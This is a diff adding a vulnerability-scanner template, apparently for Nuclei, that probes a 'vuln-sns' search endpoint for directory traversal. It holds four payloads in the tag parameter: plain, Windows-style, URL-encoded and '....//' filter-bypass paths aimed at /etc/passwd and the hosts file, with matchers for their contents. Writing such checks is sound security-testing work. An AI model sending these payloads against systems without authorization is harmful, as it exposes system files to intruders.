@@ -1,0 +1,79 @@
+id: vuln-sns-search-directory-traversal
+
+info:
+  name: vuln-sns Search Directory Traversal
+  author: devin
+  severity: medium
+  description: Directory traversal attempts in search endpoint tag parameter
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-22
+  metadata:
+    max-request: 4
+  tags: directory-traversal,search,vuln-sns
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search?tag=../../../etc/passwd"
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "/bin/bash"
+        condition: or
+        part: body
+      
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search?tag=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "localhost"
+          - "127.0.0.1"
+        condition: or
+        part: body
+      
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search?tag=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+        part: body
+      
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search?tag=....//....//....//etc/passwd"
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+        part: body
+      
+      - type: status
+        status:
+          - 200
